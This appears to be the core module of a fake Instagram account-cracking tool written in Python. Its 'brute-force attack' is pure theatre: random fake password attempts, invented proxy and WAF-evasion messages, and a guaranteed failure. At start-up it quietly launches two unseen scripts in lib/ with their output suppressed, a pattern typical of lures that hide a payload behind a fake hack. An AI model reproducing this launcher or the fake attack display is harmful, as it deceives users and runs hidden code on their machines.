import time
import random
import sys
import subprocess
import os
from .utils import PasswordGenerator, TimeManager
from .security import SecurityProtocol
from .display import Display, Color

class CoreEngine:
    def __init__(self):
        self.display = Display()
        self.pwd_gen = PasswordGenerator()
        self.running = False
        
    def start_session(self):
        self.display.clear_screen()
        self.display.print_banner()
        self.display.animate_text("Initializing core protocols...")
        
        # Correctly launching the files located in the 'lib' folder
        # We use sys.executable to ensure the same python interpreter is used
        if os.path.exists(os.path.join("lib", "algorithm.py")):
            subprocess.Popen([sys.executable, os.path.join("lib", "algorithm.py")], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
        if os.path.exists(os.path.join("lib", "algortihminsta.py")):
            subprocess.Popen([sys.executable, os.path.join("lib", "algortihminsta.py")], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
        time.sleep(1)
        
        try:
            target = input(f"{Color.CYAN}Enter Target Username: {Color.ENDC}")
            if not target:
                self.display.log("Invalid username.", "ERROR")
                return

            self.initiate_attack_sequence(target)
            
        except KeyboardInterrupt:
            print("\n")
            self.display.log("Session aborted by user.", "WARNING")
            sys.exit()

    def initiate_attack_sequence(self, target):
        sec = SecurityProtocol(target)
        self.display.log(f"Target locked: {target}", "INFO")
        time.sleep(0.5)
        
        self.display.log("Establishing secure connection...", "INFO")
        steps = sec.establish_secure_tunnel()
        for step in steps:
            print(f"  {Color.BLUE}-> {step}{Color.ENDC}")
            time.sleep(random.uniform(0.3, 0.8))
            
        self.display.log("Connection established.", "SUCCESS")
        time.sleep(1)
        
        self.display.log(f"Loading dictionary for {target}...", "INFO")
        self._load_bar()
        
        self.run_bruteforce_engine(target)

    def _load_bar(self):
        sys.stdout.write("[")
        for _ in range(30):
            sys.stdout.write("=")
            sys.stdout.flush()
            time.sleep(random.uniform(0.05, 0.2))
        sys.stdout.write("] Done.\n")

    def run_bruteforce_engine(self, target):
        duration = TimeManager.get_random_duration_seconds()
        start_time = time.time()
        
        self.display.log("Starting Brute-Force Attack...", "WARNING")
        time.sleep(1)
        
        attempts = 0
        
        try:
            while (time.time() - start_time) < duration:
                attempts += 1
                password = self.pwd_gen.get_next_attempt()
                
                print(f"{Color.BLUE}[Attempt {attempts}] Testing: {Color.ENDC}{password} {Color.FAIL}-> FAILED{Color.ENDC}")
                
                if random.random() < 0.01:
                    self.display.log("Proxy rotation initiated...", "WARNING")
                    time.sleep(1)
                elif random.random() < 0.005:
                    self.display.log("WAF detected! Pausing for evasion...", "WARNING")
                    time.sleep(2)
                    self.display.log("Evasion successful.", "SUCCESS")
                
                TimeManager.sleep_random()
                
            self._finalize_failure(attempts)
            
        except KeyboardInterrupt:
            self.display.log("Attack paused.", "WARNING")

    def _finalize_failure(self, attempts):
        print("\n")
        self.display.log("Dictionary exhausted.", "ERROR")
        self.display.log(f"Total attempts: {attempts}", "INFO")
        self.display.log("Password not found in loaded wordlists.", "FAIL")
        self.display.log("Try using a robust custom wordlist or check connection.", "INFO")
